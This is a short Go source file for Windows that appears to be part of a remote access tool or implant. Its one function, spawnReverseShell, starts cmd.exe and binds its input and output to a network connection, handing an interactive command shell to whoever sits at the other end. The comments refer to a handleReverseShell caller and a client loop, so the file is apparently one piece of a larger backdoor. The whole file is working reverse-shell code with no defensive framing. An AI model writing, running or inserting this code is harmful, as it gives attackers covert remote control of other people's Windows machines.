//go:build windows
// +build windows

package main

import (
	"net"
	"os/exec"
)

// spawnReverseShell starts cmd.exe with stdio bound to rsock.
// Runs in a background goroutine started by handleReverseShell.
func spawnReverseShell(rsock net.Conn) error {
	// Plain cmd.exe keeps broadest compatibility across Windows versions
	// and cross-compile toolchains. We avoid SysProcAttr fields entirely.
	cmd := exec.Command("cmd.exe")

	// Bind stdio to the reverse socket (interactive)
	cmd.Stdin = rsock
	cmd.Stdout = rsock
	cmd.Stderr = rsock

	// Run blocks only the background goroutine; client read loop remains free.
	return cmd.Run()
}
